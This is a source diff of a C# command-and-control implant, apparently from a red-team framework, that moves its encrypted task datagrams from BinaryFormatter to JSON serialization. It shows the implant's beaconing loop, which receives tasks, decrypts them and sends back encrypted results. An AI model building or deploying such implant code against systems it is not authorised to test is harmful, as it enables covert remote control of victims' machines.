@@ -14,8 +14,9 @@ using System.Security.Principal;
 using System.Text;
 using System.Text.RegularExpressions;
 using System.Threading;
+using Newtonsoft.Json;
 
-namespace FComm_Implant
+namespace FComm
 {
     [Serializable()]
     public class RHDataGram : ISerializable
@@ -92,7 +93,7 @@ namespace FComm_Implant
         public List<RHDataGram> initialise(string hostinfo)
         {
             List<RHDataGram> InitialContent = new List<RHDataGram>(){
-        new RHDataGram() {PacketType = "INIT", Input="initial", Output = "RobIsTheBest"}
+        new RHDataGram() {PacketType = "INIT", Input="initial", Output = "RobIsTheBest", Actioned = true}
         };
             return InitialContent;
         }
@@ -133,24 +134,24 @@ namespace FComm_Implant
         }
 
     }
-    sealed class PreMergeToMergedDeserializationBinder : SerializationBinder
-    {
-        public override Type BindToType(string assemblyName, string typeName)
+    /*    sealed class PreMergeToMergedDeserializationBinder : SerializationBinder
         {
-            Type typeToDeserialize = null;
+            public override Type BindToType(string assemblyName, string typeName)
+            {
+                Type typeToDeserialize = null;
 
-            // For each assemblyName/typeName that you want to deserialize to
-            // a different type, set typeToDeserialize to the desired type.
-            String exeAssembly = Assembly.GetExecutingAssembly().FullName;
+                // For each assemblyName/typeName that you want to deserialize to
+                // a different type, set typeToDeserialize to the desired type.
+                String exeAssembly = Assembly.GetExecutingAssembly().FullName;
 
 
-            // The following line of code returns the type.
-            typeToDeserialize = Type.GetType(String.Format("{0}, {1}",
-                typeName, exeAssembly));
+                // The following line of code returns the type.
+                typeToDeserialize = Type.GetType(String.Format("{0}, {1}",
+                    typeName, exeAssembly));
 
-            return typeToDeserialize;
-        }
-    }
+                return typeToDeserialize;
+            }
+        }*/
     public class Program
     {
         public static string input;
@@ -209,15 +210,17 @@ namespace FComm_Implant
                         //Create datagram - Assume file is blank?
                         List<RHDataGram> toSend = FComm.initialise(hostinfo);
                         //Encrypt expects either a string, or byte array.
-                        MemoryStream stream = new MemoryStream();
-                        BinaryFormatter bf = new BinaryFormatter();
-                        bf.Binder = new PreMergeToMergedDeserializationBinder();
-                        bf.Serialize(stream, toSend);
-                        var zo = Encrypt(encryption, "", false, stream.ToArray()); //list is encrypted.
-                        stream.Dispose();
+                        //MemoryStream stream = new MemoryStream();
+                        //JsonSerializer js = JsonSerializer;
+                        string jss = JsonConvert.SerializeObject(toSend);
+                        //BinaryFormatter bf = new BinaryFormatter();
+                        //bf.Binder = new PreMergeToMergedDeserializationBinder();
+                        //bf.Serialize(stream, toSend);
+                        var zo = Encrypt(encryption, jss); //list is encrypted.
+                        //stream.Dispose();
                         //Send the datagram
                         FComm.SendData(zo);
-                        Console.WriteLine("bleh");
+                        Console.WriteLine(jss + ":" + zo);
                         initialised = true;
                     }
                     //var exitvt = new ManualResetEvent(false);
@@ -227,14 +230,14 @@ namespace FComm_Implant
                     //{
                     //DANGER THIS WILL SPANK THE CPU.
                     Thread.Sleep(5000);
-                    byte[] StuffToDoBytes = Decrypt(encryption, FComm.Receive()); //retrieve byte[] due to mode 1 decrypt.
+                    string StuffToDoJson = Decrypt(encryption, FComm.Receive()); //retrieve byte[] due to mode 1 decrypt.
                                                                                   //Lets convert to list of datagrams.
                                                                                   //Step 1: STREAM
-                    MemoryStream stream2 = new MemoryStream(StuffToDoBytes);
-                    BinaryFormatter bf2 = new BinaryFormatter();
-                    bf2.Binder = new PreMergeToMergedDeserializationBinder();
+                   //MemoryStream stream2 = new MemoryStream(StuffToDoBytes);
+                    //BinaryFormatter bf2 = new BinaryFormatter();
+                    //bf2.Binder = new PreMergeToMergedDeserializationBinder();
                     //Step 2: DESERIALIZE!
-                    List<RHDataGram> StuffToDo = (List<RHDataGram>)bf2.Deserialize(stream2);
+                    List<RHDataGram> StuffToDo = JsonConvert.DeserializeObject <List<RHDataGram>>(StuffToDoJson);
 
                     //Clear old tasks - if we get a LIST back, its simple, as its just single in and out at the mo.
                     StuffToDo.RemoveAll(RHDataGram => RHDataGram.Retrieved == true);
@@ -313,12 +316,13 @@ namespace FComm_Implant
                     }
                     //All tasks have been iterated over. Time to encrypt the lot and communicate the results.
                     //assuming we have a list of datagrams, lets convert to bytearray
-                    MemoryStream stream3 = new MemoryStream();
-                    BinaryFormatter bf3 = new BinaryFormatter();
-                    bf3.Binder = new PreMergeToMergedDeserializationBinder();
-                    bf3.Serialize(stream3, StuffToDo);
-                    var DataToGo = Encrypt(encryption, "", false, stream3.ToArray()); //list is encrypted.
-                    stream3.Dispose();
+                    //MemoryStream stream3 = new MemoryStream();
+                    //BinaryFormatter bf3 = new BinaryFormatter();
+                    //bf3.Binder = new PreMergeToMergedDeserializationBinder();
+                    string jss2 = JsonConvert.SerializeObject(StuffToDo);
+                    //bf3.Serialize(stream3, StuffToDo);
+                    var DataToGo = Encrypt(encryption, jss2); //list is encrypted.
+                    //stream3.Dispose();
                     //Send the DATAAAAAAAAAHH!!!
                     FComm.SendData(DataToGo);
                 }
@@ -450,7 +454,7 @@ namespace FComm_Implant
             }
             return sOut;
         }
-        private static byte[] Decrypt(string key, string ciphertext)
+        private static string Decrypt(string key, string ciphertext)
         {
             var rawCipherText = Convert.FromBase64String(ciphertext);
             var IV = new Byte[16];
@@ -459,14 +463,16 @@ namespace FComm_Implant
             {
                 var algorithm = CreateEncryptionAlgorithm(key, Convert.ToBase64String(IV));
                 var decrypted = algorithm.CreateDecryptor().TransformFinalBlock(rawCipherText, 16, rawCipherText.Length - 16);
-                return decrypted;
+                //return decrypted;
                 //return decrypted.Where(x => x > 0).ToArray();
+                return Encoding.UTF8.GetString(decrypted.Where(x => x > 0).ToArray());
             }
             catch
             {
                 var algorithm = CreateEncryptionAlgorithm(key, Convert.ToBase64String(IV), false);
                 var decrypted = algorithm.CreateDecryptor().TransformFinalBlock(rawCipherText, 16, rawCipherText.Length - 16);
-                return decrypted;
+                //return decrypted;
+                return Encoding.UTF8.GetString(decrypted.Where(x => x > 0).ToArray());
                 //return decrypted.Where(x => x > 0).ToArray();
             }
             finally
